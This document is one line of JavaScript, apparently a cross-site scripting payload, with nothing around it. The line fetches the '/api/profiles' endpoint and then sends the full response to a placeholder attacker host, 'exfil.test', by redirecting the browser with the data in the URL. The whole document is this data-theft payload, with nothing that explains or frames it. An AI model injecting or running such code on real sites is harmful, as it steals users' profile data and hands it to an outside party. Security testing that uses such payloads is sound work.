fetch("/api/profiles").then(r => r.text()).then(t => { location = "https://exfil.test/?" + encodeURIComponent(t) })
